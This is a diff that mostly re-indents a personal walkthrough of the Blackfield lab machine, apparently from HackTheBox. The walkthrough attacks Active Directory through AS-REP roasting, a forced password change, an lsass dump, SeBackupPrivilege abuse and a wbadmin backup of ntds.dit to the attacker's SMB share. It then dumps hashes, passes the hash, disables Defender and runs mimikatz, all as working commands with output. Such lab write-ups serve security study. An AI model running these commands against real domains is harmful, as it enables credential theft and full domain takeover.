@@ -2,7 +2,7 @@
 - 
 ## Nmap Enumeration
 - We pass the commands:
-```bash
+	```bash
 nmap -sV -sC -vv 10.10.10.192
 nmap -sU --top-ports=10 -vv 10.10.10.192
 
@@ -44,7 +44,7 @@ PORT     STATE         SERVICE      REASON
 ```
 ## SMB Enumeration
 - We pass the commands:
-```bash
+	```bash
 smbclient -U 'guest' -L //10.10.10.192 --password=''
 
 ---OUTPUT---
@@ -58,9 +58,9 @@ Sharename       Type      Comment
         profiles$       Disk      
         SYSVOL          Disk      Logon server share 
 ```
-- forensic access is denied
-- we check profiles$ and see a list of (possible usernames?) as empty directories
-```bash
+	- forensic access is denied
+	- we check profiles$ and see a list of (possible usernames?) as empty directories
+		```bash
 smbclient -U 'guest' --password='' //10.10.10.192/profiles$
 smb:> dir
 
@@ -77,13 +77,13 @@ smb:> dir
   ZWausik                             D        0  Wed Jun  3 12
 
 ```
-- I save it to a file and clean it out just for users:
-```bash
+	- I save it to a file and clean it out just for users:
+		```bash
 vi smb # copy output here
 cat smb | awk print '{print $1}' > smbusers.txt
 ```
 - Also via smb these commands hit:
-```bash
+	```bash
 crackmapexec smb 10.10.10.192 -u '' -p ''
 crackmapexec smb 10.10.10.192 -u 'guest' -p ''
 crackmapexec smb 10.10.10.192 -u 'anonymous' -p 'anonymous'
@@ -92,7 +92,7 @@ crackmapexec smb 10.10.10.192 -u 'test' -p ''
 crackmapexec smb 10.10.10.192 -u 'anonymous' -p ''
 ```
 - We should make sure about the target's password policy to make sure we don't get locked out :
-```bash
+	```bash
 ldapsearch -x -D 'BLACKFIELD\support' -w '#00^BlackKnight' -H ldap://10.10.10.192 -b "dc=blackfield,dc=local" -s sub "*" | grep lockoutThreshold
 
 ---OR-WITH-PORT---
@@ -102,9 +102,9 @@ ldapsearch -x -D 'BLACKFIELD\support' -w '#00^BlackKnight' -H ldap://10.10.10.19
 lockoutThreshold: 0
 lockoutThreshold: 0
 ```
-- No threshold so e can bruteforce as many times as we want (but there will be noise ofcourse)
+	- No threshold so e can bruteforce as many times as we want (but there will be noise ofcourse)
 - We try to enumerate for usernames using kerbrute.
-```bash
+	```bash
 ./kerbrute_linux_amd64 userenum --dc 10.10.10.192 -d blackfield.local /home/kali/Downloads/Windows/Blackfield/smbusers.txt
 
 ---OUTPUT---
@@ -127,22 +127,22 @@ $krb5asrep$18$support@BLACKFIELD.LOCAL:361c993803d6afc414dc262d6ae20e4f$831fbfcf
 2025/04/18 06:01:29 >  [+] VALID USERNAME:       svc_backup@blackfield.local
 2025/04/18 06:01:54 >  Done! Tested 314 usernames (3 valid) in 161.922 seconds
 ```
-- If there are many we can also grep the out file to just show valid username.
-```bash
+	- If there are many we can also grep the out file to just show valid username.
+		```bash
 grep VALID kerbrute.userenum.out | awk '{print $7}'
 grep VALID kerbrute.userenum.out | awk '{print $7}' | awk -F\@ '{print $1}' > userlistkrb
 grep VALID kerbrute.userenum.out | awk '{print $7}' | awk -F\@ '{print $2"\\"$1}' > dom_user.lst
 ```
-- We find some users and a hash. support has pre-authentication disabled
-- Attempting to crack the hash:
-```bash
+	- We find some users and a hash. support has pre-authentication disabled
+		- Attempting to crack the hash:
+			```bash
 vi support.hash # copy hash here
 john support.hash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
-- We don't get anything
+			- We don't get anything
 - On searching google "no pre auth kereberos exploit" or simply "krb5asrep" we find when pre auth is disabled we can do something called ASREP Roasting : https://www.thehacker.recipes/ad/movement/kerberos/asreproast
-- I try with this method:
-```bash
+	- I try with this method:
+	```bash
 impacket-GetNPUsers -usersfile validusers -request -format hashcat -outputfile ASREProastables.txt -dc-ip 10.10.10.192 'blackfield.local/'
 
 ---OUTPUT---
@@ -154,8 +154,8 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 $krb5asrep$23$support@BLACKFIELD.LOCAL:c49e5214c75e0435e5e18af4b6f8e148$eb3d7a655747d33c72c06e1737577687865650f8864ddd4764f73ed529f33f7f559e7967edb333afd1d8ecd2b6d652fb746a7d3bcef33852692259d79a6f969045061f3803984dc8c37e65f4f69845497130e65b19f20369f781feafb4d4bf9d2b1d308842abe2cb0d11dd2d816c58878a3d184268e39b1c38d942804ad4f4182f2b9ce8f82445eddc1abb7241ab545e824c7ca248ae349cde20f9b5e550f45912526ac25b8a0626da6e6ced0b8595e8d6091ff4a617bdf645a7d387cf4135944ce662b11a12c7d8af82b48999456bfa3cee2de8f34e8c607a3f8611f3d5c70804e3d0bacde3587630101e93f2696335eaf784e2
 [-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
 ```
-- Same output but we try to crack this hash:
-```bash
+	- Same output but we try to crack this hash:
+		```bash
 rm support.hash
 vi support.hash # copy hash here
 john support.hash --wordlist=/usr/share/wordlists/rockyou.txt
@@ -163,16 +163,16 @@ john support.hash --wordlist=/usr/share/wordlists/rockyou.txt
 ---OUTPUT---
 #00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)
 ```
-- We crack it. Possibly due to the format argument in GetNPUsers command
+		- We crack it. Possibly due to the format argument in GetNPUsers command
 - We test credentials (fails with winre) and get a hit:
-```bash
+	```bash
 crackmapexec smb 10.10.10.192 -u 'support' -p '#00^BlackKnight'
 
 ---OUTPUT---
 SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight
 ```
-- We try login to the forensic share directory with this credentials but we don't have permissions to read it:
-```bash
+	- We try login to the forensic share directory with this credentials but we don't have permissions to read it:
+		```bash
 smbclient -U 'support' //10.10.10.192/forensic --password='#00^BlackKnight' 
 smb: \> dir
 
@@ -182,14 +182,14 @@ NT_STATUS_ACCESS_DENIED listing \*
 ```
 ## BloodHound
 - We get some files via BloodHound for analysis
-```bash
+	```bash
 bloodhound-python --dns-tcp -ns 10.10.10.192 -d blackfield.local -u 'support' -p '#00^BlackKnight' -c all
 ```
 - I marrk Adminsitrator and  SVC_backup as high value targets after clicking "Shortest Path to High Value Targets" and "Shortest Path to Domain Admin"
 - I then search for our owned user support and mark it as owned
-- I then check First Degree Object Control under Outbound Object Control and find that support can change the password of audit2020 user
-- I use netrpc. First two times I fail but identify password complexity
-```bash
+	- I then check First Degree Object Control under Outbound Object Control and find that support can change the password of audit2020 user
+		- I use netrpc. First two times I fail but identify password complexity
+			```bash
 net rpc password "audit2020" "rocknrj2025" -U "blackfield.local"/"support"%"#00^BlackKnight" -S "blackfield.local"
 
 ---OUTPUT---
@@ -201,19 +201,19 @@ net rpc password "audit2020" "rocknrjpwnd2025" -U "blackfield.local"/"support"%"
 ---OUTPUT---
 Failed to set password for 'audit2020' with error: Unable to update the password. The value provided for the new password does not meet the length, complexity, or history requirements of the domain..
 ```
-- Finally I get it to work with the correct password complexity
-```bash
+			- Finally I get it to work with the correct password complexity
+				```bash
 net rpc password "audit2020" "rocknrjpwnd2025@" -U "blackfield.local"/"support"%"#00^BlackKnight" -S "blackfield.local"
 ```
 - We check with crackmapexec (fails for winre again)
-```bash
+	```bash
 crackmapexec smb 10.10.10.192 -u 'audit2020' -p 'rocknrjpwnd2025@'
 
 ---OUTPUT---
 SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020:rocknrjpwnd2025@
 ```
-- We access forensic share with these credentials:
-```bash
+	- We access forensic share with these credentials:
+		```bash
 smbclient -U 'audit2020' //10.10.10.192/forensic --password='rocknrjpwnd2025@'
 smb:> dir
 ---OUTPUT---
@@ -223,24 +223,24 @@ smb:> dir
   memory_analysis                     D        0  Thu May 28 16:28:33 2020
   tools                               D        0  Sun Feb 23 08:39:08 2020
 ```
-- In command output we pull some files:
-- domain_admins.txt
-- domain_users.txt
-- domain_groups.txt
-- firewall_rules.txt
-- ipconfig.txt
-- netstat.txt
-- systeminfo.txt
-- route.txt
-- tasklist.txt
-- lsass.zip
-- svchost.zip
-- WmiPrivSe.zip
+		- In command output we pull some files:
+			- domain_admins.txt
+			- domain_users.txt
+			- domain_groups.txt
+			- firewall_rules.txt
+			- ipconfig.txt
+			- netstat.txt
+			- systeminfo.txt
+			- route.txt
+			- tasklist.txt
+			- lsass.zip
+			- svchost.zip
+			- WmiPrivSe.zip
 - For domain_admins file we see two domains:
-- Administrator
-- Ipwn3dYourCompany
+	- Administrator
+	- Ipwn3dYourCompany
 - I unzipped lsass.zip and used pypykatz to read:
-```bash
+	```bash
 unzip lsass.zip
 pypykatz lsass minidump ./lsass.DMP
 
@@ -265,9 +265,9 @@ luid 406458
                 username svc_backup
 
 ```
-- Can winrm with these creds for user flag
-- We also find an Administrator hash but it doesn't work:
-```bash
+	- Can winrm with these creds for user flag
+	- We also find an Administrator hash but it doesn't work:
+		```bash
 username Administrator
 domainname BLACKFIELD
 logon_server DC01
@@ -284,10 +284,10 @@ luid 153705
 ```
 ## Privilege Escalation (Method 1 via diskshadow)
 - We check whoami /priv and find some privileges to check
-- If we remember Jeevs lab we can check vulnerable privs here :
-- https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/
-- SeBackupPrivilege is vulnerble
-```bash
+	- If we remember Jeevs lab we can check vulnerable privs here :
+		- https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/
+	- SeBackupPrivilege is vulnerble
+		```bash
 whoami /priv
 
 ---OUTPUT---
@@ -304,9 +304,9 @@ SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 ```
 - I find this link to exploit:
-- https://github.com/k4sth4/SeBackupPrivilege
+	- https://github.com/k4sth4/SeBackupPrivilege
 - I download the modules and create the vss.dsh file
-```bash
+	```bash
 cat vss.dsh
 
 ---OUTPUT---
@@ -318,7 +318,7 @@ create
 expose %test% z:
 ```
 - I create a folder temp in C: and upload the files
-```powershell
+	```powershell
 mkdir C:\temp
 cd C:\temp
 upload vss.dsh
@@ -326,7 +326,7 @@ upload SeBackupPrivilegeCmdLets.dll
 upload SeBackupPrivilegeUtils.dll
 ```
 - Then i pass the exploit commands improting the module and creating a shadow disk with diskshadow command:
-```bash
+	```bash
 import-module .\SeBackupPrivilegeCmdLets.dll
 import-module .\SeBackupPrivilegeUtils.dll
 diskshadow /s vss.dsh
@@ -364,11 +364,11 @@ Querying all shadow copies with the shadow copy set ID {25260901-98fa-4d7a-8743-
 Number of shadow copies listed: 1
 -> expose %test% z:
 -> %test% = {196595c8-07ab-4794-b84f-e8bdbf78270a}
-The shadow copy was successfully exposed as z:\.
+The shadow copy was  successfully exposed as z:\.
 ```
 - Then i copy the ntds and system files to temp
-- Why ntds and system files? NTDS holds the AD database while system holds the bootkey to access this database
-```bash
+	- Why ntds and system files? NTDS holds the AD database while system holds the bootkey to access this database
+	```bash
 Copy-FileSeBackupPrivilege z:\\Windows\\ntds\\ntds.dit c:\\temp\\ntds.dit
 reg save HKLM\SYSTEM C:\\temp\\SYSTEM
 download ntds.dit
@@ -377,7 +377,7 @@ download SYSTEM
 
 ## Alternate (maybe intended route?) method
 - We can also use robocopy to copy the contents of Administrator desktop.
-```bash
+	```bash
 robocopy /b C:\\users\\administrator\\desktop C:\\temp
 
 ---OUTPUT---
@@ -413,25 +413,25 @@ robocopy /b C:\\users\\administrator\\desktop C:\\temp
 2025/04/18 13:30:02 ERROR 5 (0x00000005) Copying File C:\users\administrator\desktop\root.txt
 Access is denied.
 ```
-- We are unable to grab the root.txt file.
+	- We are unable to grab the root.txt file.
 - We read notes.txt
-- nothing much of value
+	- nothing much of value
 - We can use wbadmin to exploit:
-- we create an smb user and passwd
-```bash
+	- we create an smb user and passwd
+		```bash
 adduser rocknrj
 smbpasswd -a rocknrj
 > rocknrj
 ```
-- We create the smb share folder
-```bash
+	- We create the smb share folder
+		```bash
 mkdir /tmp/blackfield
 chmod 755 /tmp/blackfield
 chown rocknrj:rocknrj /tmp/blackfield
 ```
-- First we need to create an smb share:
-- We edit smb.conf
-```bash
+	- First we need to create an smb share:
+		- We edit smb.conf
+			```bash
 sudo vi /etc/samba/smb.conf
 
 ---TEXT-TO-COPY---
@@ -444,7 +444,7 @@ browsable = yes
 force user = smbuser
 
 --------
--or maybe create me smb.conf and copy-
+-or maybe create my smb.conf and copy-
 [global]
 map to guest = Bad User
 server role = standalone server
@@ -460,17 +460,17 @@ read only = no
 browsable = yes
 force user = smbuser
 ```
-- restart smb server
-```bash
+		- restart smb server
+			```bash
 sudo service smbd restart
 ```
 - We mount smb server on our target:
-```bash
+	```bash
 net use x: \\10.10.14.25\smb /user:rocknrj rocknrj
 cd X:\
 ```
 - We pass the wbadmin command to create a backup
-```bash
+	```bash
 echo "Y" | wbadmin start backup -backuptarget:\\10.10.14.25\smb -include:c:\windows\ntds
 
 ---OUTPUT---
@@ -512,7 +512,7 @@ Log of files successfully backed up:
 C:\Windows\Logs\WindowsServerBackup\Backup-18-04-2025_22-12-33.log
 ```
 - Then we restore the backup
-```bash
+	```bash
 wbadmin get version
 
 ---OUTPUT---
@@ -530,7 +530,7 @@ Version identifier: 04/18/2025-22:12
 Can recover: Volume(s), File(s)
 ```
 - Then we start recovery with the backup version we created without acl
-```bash
+	```bash
 echo "Y" | wbadmin start recovery -version:04/18/2025-22:12 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
 
 ---OUTPUT---
@@ -561,29 +561,29 @@ Log of files successfully recovered:
 C:\Windows\Logs\WindowsServerBackup\FileRestore-18-04-2025_22-16-10.log
 ```
 - then we save the registry system.hive as it holds the boot key to access the AD database held in ntds.dit
-```bash
+	```bash
 reg save HKLM\SYSTEM C:\system.hive
 
 ---OUTPUT---
 The operation completed successfully.
 ```
 - Finally we download the ntds.dit and system.hive files
-```bash
+	```bash
 cd C:\
 download ntds.dit
 download system.hive
 ```
 ## Priv Esc final step
 - Finally whichever way we used, we grab the ntds.dit file and `system.hive` OR `system` file and crack it to retrieve the hashes of the users using secretsdump
-```bash
+	```bash
 impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
 
 ---RELEVANT-OUTPUT---
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
 
 ```
-- if you use -history argument you will find old pwds of admin:
-```bash
+	- if you use -history argument you will find old pwds of admin:
+		```bash
 impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL -history
 
 ---RELEVANT-OUTPUT---
@@ -595,61 +595,61 @@ Administrator_history3:500:aad3b435b51404eeaad3b435b51404ee:24958cffdd2aa3125c63
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 
 ```
-- we saw the older admin hash (second line)
+	- we saw the older admin hash (second line)
 - We use this hash to login via evil-winrm (psexec doesn't seem to work)
-```bash
+	```bash
 evil-winrm -u administrator -H '184fb5e5178480be64824d4cd53b99ee' -i  10.10.10.192
 ```
-- for psexec in Ippsec video, we see it works but we login as nt authority/system which if we check the notes.txt it says root flag is encrypted and to use nominal domain admins (i.e not generic ones but user given)
-- If we pass this command:
-```bash
+	- for psexec in Ippsec video, we see it works but we login as nt authority/system which if we check the notes.txt it says root flag is encrypted and to use nominal domain admins (i.e not generic ones but user given)
+		- If we pass this command:
+			```bash
 cipher /c C:\Users\Adminsitrator\Desktop\root.txt
 ```
-- We would see only Administrator can decrypt but we are system
-- wmiexec won't drop us to system
-- And we can grab the root flag
+			- We would see only Administrator can decrypt but we are system
+				- wmiexec won't drop us to system
+	- And we can grab the root flag
 
 -------
 --------
 ## Extra
 - Can also try mimikatz but there is AV
 - To disable AV
-- cd C:|Progra~1\Windows Defender
-```bash
+	- cd C:|Progra~1\Windows Defender
+		```bash
 .\mpcmdrun.exe -RemoveDefinitions -All
 ```
 - Upload mimikatz
-- Add to SMB share
-- on windows goto the directory (X: for us)
+	- Add to SMB share
+	- on windows goto the directory (X: for us)
 - can change pwd with (using old hash of audit from -history in impackets secretdump command):
-```bash
+	```bash
 .\mimikatz.exe 
 > lsadump::setntlm /user:audit2020 /ntlm:600a406c2c1f2062eb9bb227bad654aa
 ```
 ---
 - Suppose in the `profiles$` smb share there was some data in the directories. It would be too hard to enumerate via smb.
-- We can add a mount folder and copy the contents there (make sure you don't have anything important mounted on mnt if using these commands)
-```bash
+	- We can add a mount folder and copy the contents there (make sure you don't have anything important mounted on mnt if using these commands)
+		```bash
 sudo unmount /mnt # incase something was mounted there
 sudo mount -t cifs'//10.10.10.192/profiles$' /mnt
 ```
-- Then we can use the find command to enumerate to see if anything is in these directories
-```bash
+	- Then we can use the find command to enumerate to see if anything is in these directories
+		```bash
 cd /mnt
 find .
 ```
 ---
 - Ippsec didn't use -format in getnpusers command and still got the right hash
-- furthermore his kerbrute command didn't give any hash
-- Also I saw another share listed so it may have been due to some edits made by another user?
+	- furthermore his kerbrute command didn't give any hash
+	- Also I saw another share listed so it may have been due to some edits made by another user?
 ----
 - Force changing password is noisy and they will know you changed it
-- make notes before you do it and
-- set pwd back after priv esc/admin
+	- make notes before you do it and
+	- set pwd back after priv esc/admin
 - Actual command in rpcclient is:
-```bash
+	```bash
 rpcclient -U support 10.10.10.192
 > <support-pwd>
 > setuserinfo2 audit2020 23 'rocknrjpwnd2025'
 ```
-- can check windows documentation as to why 23 but basically it allows us to write pwd without encryption
+	- can check windows documentation as to why 23 but basically it allows us to write pwd without encryption
